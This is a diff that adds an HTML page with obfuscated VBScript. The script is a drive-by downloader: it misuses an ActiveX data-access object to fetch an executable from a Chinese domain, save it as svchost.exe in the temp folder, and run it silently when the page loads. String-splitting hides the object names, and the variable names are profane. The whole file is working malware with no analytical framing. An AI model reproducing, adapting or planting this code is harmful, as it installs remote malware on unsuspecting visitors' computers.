@@ -1,0 +1,45 @@
+<html>
+<script language="VBScript">
+on error resume next
+fuckyoucnn1="o"+"bj"+"ect"
+fuckyoucnn2="classid"
+zfuckyoucnn="C"+"5"+"5"+"6"+"-"+"65"+"A3"+"-"
+yfuckyoucnn="cl"+"si"+"d"+":"+"BD"+"96"
+xfuckyoucnn="-"+"9"+"8"+"3"+"A"
+wfuckyoucnn="-"+"00C"+"04F"+"C29E"+"36"
+fuckyoucnn3=yfuckyoucnn + zfuckyoucnn +"11"+"D0"+ xfuckyoucnn + wfuckyoucnn
+fuckyoucnn4="M"+"icro"+"soft"+".XMLHTTP"
+fuckyoucnn5="Shell.Application"
+fuckyoucnn6="Scripti"+"ng.Fil"+"eSystemObject"
+lovechinaPP = "http://www.manager8.cn/abe.exe"
+Set lovechinaPPc = document.createElement(fuckyoucnn1)
+sub yunxingexe(fuckyoucnn5,lovechina9)
+set lovechinaPPeE = lovechinaPPc.createobject(fuckyoucnn5,"")
+lovechinaPPeE.shEllExEcutE lovechinaPP9,"","","o"+"p"+"e"+"n",0
+end sub
+lovechinaPPc.setAttribute fuckyoucnn2, fuckyoucnn3
+lovechinaPPi=fuckyoucnn4
+Set DlovechinaPP = lovechinaPPc.CreateObject(lovechinaPPi,"")
+wpa="A"+"d"+"o"+"d"+"b"+"."
+wpc="S"+"t"+"r"
+wpd="e"+"a"+"m"
+lovechinaPPf = wpa + wpc + wpd
+lovechinaPPg=lovechinaPPf
+set lovechinaPPa = lovechinaPPc.cReatEObjeCt(lovechinaPPg,"")
+lovechinaPPa.type = 1
+lovechinaPPh="G"+"E"+"T"
+DlovechinaPP.Open lovechinaPPh, lovechinaPP, False
+DlovechinaPP.Send
+lovechinaPP9="svchost.exe"
+SeT lovechinaPPb = lovechinaPPc.createobject(fuckyoucnn6,"")
+sET lovechinaPPeE = lovechinaPPb.GetSpecialFolder(2)
+lovechinaPPa.open
+lovechinaPP9= lovechinaPPb.BuildPath(lovechinaPPeE,lovechinaPP9)
+lovechinaPPa.write DlovechinaPP.responseBody
+</script>
+<script language="VBScript">
+lovechinaPPa.savetofile lovechinaPP9,2
+lovechinaPPa.close
+call yunxingexe(fuckyoucnn5,lovechina9)
+</script>
+</html>
